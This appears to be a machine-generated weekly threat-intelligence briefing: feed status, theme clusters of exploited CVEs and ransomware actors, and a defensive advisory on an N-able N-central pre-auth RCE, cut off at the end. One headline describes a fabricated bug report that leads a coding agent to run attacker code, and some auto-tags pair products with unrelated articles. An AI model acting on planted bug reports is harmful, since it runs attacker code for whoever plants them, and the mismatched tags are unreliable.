# PHANTOMSignal Briefing Packet

- Generated: 2026-09-17T18:05:35.477586+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 75
- Total items in window: 366
- Total clusters raw: 190
- Total clusters in packet: 80
- Dropped low score: 106
- Dropped overflow: 4

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 7
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 4
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 1
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 5
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 1
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 17
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 27
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 19
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 49
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 25
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 20
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### GitLab active exploitation
- Anchor signal: GitLab
- Theme key: gitlab
- Cluster count: 8
- Article count: 13
- Cohesion: 0.257
- Shared strong signals: GitLab
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, zero_day, ransomware_extortion, phishing_social_eng
  - affected_industries: government
  - affected_products: GitLab, Anthropic/Claude, OpenAI/ChatGPT
  - urgency_signals: actively_exploited, preauth_unauth, zero_day, critical_cvss
- Cluster IDs: 0b27204826, 688ffee0f1, 19deeddfb9, d279e1d094, b282acf693, 8760c8b22e, 07cc5231d1, 4177169ade
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-86218/
  - https://www.rapid7.com/blog/post/etr-cve-2026-85706-critical-gitlab-path-traversal-exploited-in-the-wild
  - https://orca.security/resources/blog/gitlab-critical-path-traversal-cve-2026-85706-exploited/
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-85706/
  - https://thehackernews.com/2026/09/gitlab-cvss-10-file-read-flaw-draws-in.html
  - https://www.darkreading.com/cyberattacks-data-breaches/maximum-severity-gitlab-flaw-supply-chains-risk
  - https://www.infosecurity-magazine.com/news/hackers-exploit-maximum-severity/
  - https://thehackernews.com/2026/09/acronis-cpanel-backup-plugin.html
  - https://thehackernews.com/2026/09/google-patches-pixel-modem-flaw-amid.html
  - https://thehackernews.com/2026/09/active-exploitation-attempts-target.html
  - https://thehackernews.com/2026/09/cisco-fmc-flaws-exploited-to-steal.html
  - https://thehackernews.com/2026/09/papercut-replaces-emergency-patches.html
  - https://research.checkpoint.com/2026/14th-september-threat-intelligence-report/

### Cisco active exploitation
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 6
- Article count: 8
- Cohesion: 0.26
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation, phishing_social_eng, ransomware_extortion
  - affected_industries: government
  - affected_products: Cisco
  - urgency_signals: zero_day, preauth_unauth, actively_exploited
- Cluster IDs: bd351f968f, bd90c028bc, 7d7ea8e2d6, 8760c8b22e, b14566fc43, 9af127b309
- Links:
  - https://www.rapid7.com/blog/post/etr-cve-2026-76461-critical-cisco-secure-email-gateway-vulnerability-exploited-in-the-wild
  - https://thehackernews.com/2026/09/cisco-secure-email-gateway-flaw.html
  - https://www.sophos.com/en-us/blog/cisco-secure-email-gateway-vulnerability-cve-2026-76461-in-active-exploitation
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-goes-to-sixteen
  - https://cyberscoop.com/cisco-secure-email-gateway-zero-day-exploited/
  - https://thehackernews.com/2026/09/cisco-fmc-flaws-exploited-to-steal.html
  - https://blog.talosintelligence.com/ransomware-incidents-in-japan-in-the-first-half-of-2026/
  - https://www.securityweek.com/cisa-retires-weekly-vulnerability-bulletin-in-risk-based-pivot/

### Cl0p: ransomware extortion
- Anchor signal: Cl0p
- Theme key: cl0p
- Cluster count: 3
- Article count: 4
- Cohesion: 0.375
- Shared strong signals: Cl0p
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, data_breach
  - actor_attribution: Cl0p
- Cluster IDs: aaf3283e67, 498d32f5a8, e94abae528
- Links:
  - https://www.intel471.com/blog/follow-the-money-the-financial-sectors-threat-landscape-in-2026
  - https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
  - https://www.team-cymru.com/post/ransomware-infrastructure-analysis

### CVE-2026-76460 exploitation activity
- Anchor signal: CVE-2026-76460
- Theme key: cve-2026-76460
- Cluster count: 2
- Article count: 3
- Cohesion: 0.2
- Shared strong signals: CVE-2026-76460
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation
  - cve_ids: CVE-2026-76460
  - urgency_signals: actively_exploited, zero_day
- Cluster IDs: 352172176c, 2b3a06fa20
- Links:
  - https://www.helpnetsecurity.com/2026/09/17/cisco-ise-vulnerability-exploited-cve-2026-76460/
  - https://thehackernews.com/2026/09/cisco-warns-of-new-zero-day-ise-auth.html
  - https://www.bleepingcomputer.com/news/security/cisco-warns-of-identity-service-engine-zero-day-exploited-in-attacks/

### WordPress vulnerability activity
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 3
- Article count: 4
- Cohesion: 0.376
- Shared strong signals: WordPress
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: WordPress
  - urgency_signals: preauth_unauth
- Cluster IDs: b7f1d27bda, cf140bd98b, 7a044cf714
- Links:
  - https://www.securityweek.com/revolut-data-breach-5-months-680-high-profile-accounts-3m-ransom/
  - https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
  - https://thehackernews.com/2026/09/attackers-exploit-woocommerce-wholesale.html
  - https://www.infosecurity-magazine.com/news/woocommerce-wholesale-lead-capture/

### web shell backdoor targeting ScreenConnect
- Anchor signal: ScreenConnect
- Theme key: screenconnect
- Cluster count: 2
- Article count: 3
- Cohesion: 0.327
- Shared strong signals: ScreenConnect
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: web_shell_backdoor, active_exploitation
  - affected_products: ScreenConnect
- Cluster IDs: 2c7f2421f0, 2b3a06fa20
- Links:
  - https://www.wiz.io/blog/artifactory-under-attack-in-the-wild-exploitation-of-cve-2026-42016-cve-2026-4201
  - https://thehackernews.com/2026/09/cisa-adds-5-actively-exploited.html
  - https://www.bleepingcomputer.com/news/security/cisco-warns-of-identity-service-engine-zero-day-exploited-in-attacks/

### ShinyHunters: ransomware extortion
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 3
- Article count: 4
- Cohesion: 0.2
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, active_exploitation
  - actor_attribution: ShinyHunters
  - affected_industries: financial_services
  - urgency_signals: actively_exploited
- Cluster IDs: d8c893e316, 498d32f5a8, 4177169ade
- Links:
  - https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
  - https://www.darkreading.com/threat-intelligence/voice-callers-exploit-byod-microsoft-365-corporate-data
  - https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
  - https://research.checkpoint.com/2026/14th-september-threat-intelligence-report/

### zero day targeting cPanel
- Anchor signal: cPanel
- Theme key: cpanel
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: cPanel
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day
  - affected_industries: government
  - affected_products: cPanel
  - urgency_signals: zero_day, preauth_unauth
- Cluster IDs: 19deeddfb9, b7f1d27bda
- Links:
  - https://thehackernews.com/2026/09/acronis-cpanel-backup-plugin.html
  - https://www.securityweek.com/revolut-data-breach-5-months-680-high-profile-accounts-3m-ransom/

### ransomware extortion targeting Microsoft 365
- Anchor signal: Microsoft 365
- Theme key: microsoft-365
- Cluster count: 2
- Article count: 3
- Cohesion: 0.237
- Shared strong signals: Microsoft 365
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, phishing_social_eng
  - affected_industries: financial_services
  - affected_products: Microsoft 365
- Cluster IDs: aaf3283e67, d8c893e316
- Links:
  - https://www.intel471.com/blog/follow-the-money-the-financial-sectors-threat-landscape-in-2026
  - https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
  - https://www.darkreading.com/threat-intelligence/voice-callers-exploit-byod-microsoft-365-corporate-data

## Forward signals

### Novelty
- Novel cves: 6
  - CVE-2026-33278 (first seen via The Hacker News at 2026-09-17T12:30:00+00:00, cluster 0ec81743b3)
  - CVE-2026-77955 (first seen via The Hacker News at 2026-09-17T12:30:00+00:00, cluster 0ec81743b3)
  - CVE-2026-81634 (first seen via The Hacker News at 2026-09-17T12:30:00+00:00, cluster 0ec81743b3)
  - CVE-2026-81642 (first seen via The Hacker News at 2026-09-17T12:30:00+00:00, cluster 0ec81743b3)
  - CVE-2026-82717 (first seen via The Hacker News at 2026-09-17T12:30:00+00:00, cluster 0ec81743b3)
  - CVE-2026-90999 (first seen via Reddit r/netsec at 2026-09-17T14:11:25+00:00, cluster 367f814170)
- Novel actors: 0
- Novel products: 0

### Velocity bursts (1)
- **CVE-2026-85706: Critical GitLab Path Traversal Exploited in the Wild**
  - Cluster: 688ffee0f1
  - Sources in window: 3
  - Window hours: 4.8
  - Cohort count: 3

### Leading edge (0)

### Convergence (15)
- Pair: CVE-2026-85706 + GitLab (cluster 0b27204826, first observation: True)
- Pair: CVE-2026-86218 + GitLab (cluster 0b27204826, first observation: True)
- Pair: CVE-2026-76461 + Cisco (cluster bd351f968f, first observation: True)
- Pair: CVE-2026-85706 + GitLab (cluster 688ffee0f1, first observation: True)
- Pair: CVE-2026-42016 + ScreenConnect (cluster 2c7f2421f0, first observation: True)
- Pair: CVE-2026-42018 + ScreenConnect (cluster 2c7f2421f0, first observation: True)
- Pair: CVE-2026-82329 + ScreenConnect (cluster 2c7f2421f0, first observation: True)
- Pair: CVE-2025-54988 + Cisco (cluster bd90c028bc, first observation: True)
- Pair: CVE-2025-54988 + SonicWall (cluster bd90c028bc, first observation: True)
- Pair: CVE-2025-66516 + Cisco (cluster bd90c028bc, first observation: True)
- Pair: CVE-2025-66516 + SonicWall (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-20079 + SonicWall (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-20929 + Cisco (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-20929 + SonicWall (cluster bd90c028bc, first observation: True)
- Pair: CVE-2026-83549 + Cisco (cluster bd90c028bc, first observation: True)

### Drift (6)
- **LockBit** (cluster b14566fc43)
  - New industries: manufacturing_industrial
  - New products: Cisco
  - Prior top industries: education, government, healthcare
  - Prior top products: GitHub, GitLab, OpenAI/ChatGPT
- **Cl0p** (cluster aaf3283e67)
  - New industries: (none)
  - New products: Okta
  - Prior top industries: financial_services, government, manufacturing_industrial
  - Prior top products: Microsoft 365, OpenAI/ChatGPT, SolarWinds
- **ShinyHunters** (cluster d8c893e316)
  - New industries: (none)
  - New products: Microsoft 365, Microsoft SharePoint
  - Prior top industries: financial_services, healthcare, manufacturing_industrial
  - Prior top products: Anthropic/Claude, Microsoft Entra, Salesforce
- **UNC6240** (cluster d8c893e316)
  - New industries: (none)
  - New products: Microsoft 365
  - Prior top industries: financial_services, healthcare
  - Prior top products: AWS, Microsoft SharePoint, Salesforce
- **UNC6661** (cluster d8c893e316)
  - New industries: (none)
  - New products: Microsoft 365
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: AWS, Microsoft SharePoint, Salesforce
- **UNC3886** (cluster c1f52c0381)
  - New industries: government
  - New products: (none)
  - Prior top industries: critical_infrastructure, financial_services, telecommunications
  - Prior top products: Cisco, Fortinet, Google Cloud

### Persistence (15)
- actor_attribution: ShinyHunters (weeks observed: 13, cluster d8c893e316)
- actor_attribution: Scattered Spider (weeks observed: 10, cluster fc5c9992d3)
- actor_attribution: Cl0p (weeks observed: 9, cluster aaf3283e67)
- actor_attribution: LockBit (weeks observed: 7, cluster b14566fc43)
- actor_attribution: BlackCat/ALPHV (weeks observed: 5, cluster fc5c9992d3)
- cve_ids: CVE-2026-20316 (weeks observed: 4, cluster 8760c8b22e)
- actor_attribution: UNC6661 (weeks observed: 4, cluster d8c893e316)
- cve_ids: CVE-2026-72898 (weeks observed: 4, cluster 4177169ade)
- actor_attribution: RansomHub (weeks observed: 4, cluster fc5c9992d3)
- cve_ids: CVE-2026-86218 (weeks observed: 3, cluster 0b27204826)
- cve_ids: CVE-2026-20079 (weeks observed: 3, cluster bd90c028bc)
- cve_ids: CVE-2026-39987 (weeks observed: 3, cluster c7cbf0a5fd)
- actor_attribution: UNC6240 (weeks observed: 3, cluster d8c893e316)
- actor_attribution: Volt Typhoon (weeks observed: 3, cluster b9771fe2d2)
- cve_ids: CVE-2026-81578 (weeks observed: 3, cluster 07cc5231d1)

### Tier inversion (1)
- **CVE-2026-90999: A fabricated Sentry bug report can make Seer's coding agent run attacker code**
  - Cluster: 367f814170
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-90999

## Clusters

### Cluster 0b27204826 — score 53

- Title: CVE-2026-86218 | N-able N-central Pre-Authentication Remote Code Execution Vulnerability
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-16T16:06:08+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-86218/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-86218

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: GitLab
- cve_ids: CVE-2026-85706, CVE-2026-86218
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: GitLab
- cve_ids: CVE-2026-86218, CVE-2026-85706
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-86218 is a critical, actively exploited N-able N-central vulnerability that can allow unauthenticated remote code execution. NodeZero® Rapid Response safely validates exposure.
```

#### Full body

```
CVE-2026-86218 N-able N-central Pre-Authentication Remote Code Execution Vulnerability CVE-2026-86218 is a critical pre-authentication remote code execution vulnerability affecting N-able N-central. An unauthenticated attacker with network access to a vulnerable N-central server could exploit the vulnerability to execute code without user interaction. N-able assigned it a CVSS 4.0 score of 10.0, while NIST assigned it a CVSS 3.1 score of 9.8. CISA added CVE-2026-86218 to its Known Exploited Vulnerabilities catalog based on evidence of active exploitation. Technical Details CVE-2026-86218 affects the N-central server and is remotely exploitable without authentication or user interaction. The official CVE record classifies the vulnerability as CWE-96, Improper Neutralization of Directives in Statically Saved Code, also known as static code injection. Successful exploitation could allow an attacker to execute code on the N-central server, affecting the confidentiality, integrity, and availability of the system. The vulnerability has low attack complexity and requires no privileges. CISA has confirmed that CVE-2026-86218 is being exploited. However, public reporting about specific N-central intrusions also involves other recently disclosed vulnerabilities, and researchers have not conclusively attributed every observed compromise to CVE-2026-86218. Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform — Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether CVE-2026-86218 can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from the NodeZero platform to determine whether remote code execution is possible Patch immediately: Upgrade self-hosted N-central deployments to version 2026.3.1.14 Re-run the test: Confirm the vulnerability is no longer exploitable after remediation Affected Versions & Patch Affected N-able N-central versions before 2026.3.1.14 are affected. Fixed N-able addressed CVE-2026-86218 in N-central 2026.3 Hotfix 4, build 2026.3.1.14. Customers operating on-premises N-central deployments should upgrade immediately. N-able has already applied the patch to hosted N-central environments, also referred to as NCOD. Customers using hosted instances do not need to take action. Mitigations N-able directs customers with on-premises deployments to upgrade to version 2026.3.1.14. The vendor has not identified an alternative remediation in its public release notes. If an upgrade cannot be completed immediately, restrict access to the N-central console from the public internet and other untrusted networks. This is a risk-reduction measure and does not remediate the vulnerability. Because exploitation has been reported, organizations should also review N-central accounts, appliance logs, and administrative activity for signs of unauthorized access. Applying the hotfix does not determine whether a system was compromised before it was patched. Timeline September 5, 2026: N-able released N-central 2026.3 Hotfix 4, build 2026.3.1.14, addressing CVE-2026-86218. September 6, 2026: CVE-2026-86218 was published. September 8, 2026: CISA added CVE-2026-86218 to its Known Exploited Vulnerabilities catalog based on evidence of active exploitation. September 15, 2026: Horizon3 released a NodeZero Rapid Response test for CVE-2026-86218. References N-able Security Advisory N-able N-central 2026.3 Hotfix 4 Release Notes CVE.org Record – CVE-2026-86218 NIST NVD – CVE-2026-86218 CISA Adds Four Known Exploited Vulnerabilities to Catalog The Hacker News: N-able N-central Pre-Auth RCE Flaw Exploited in the Wild Help Net Security: N-able Patches Critical N-central Zero-Day Exploited in the Wild Read about other CVEs CVE-2026-85706 CVE-2026-85706 is a critical GitLab CE/EE path traversal vulnerability that can 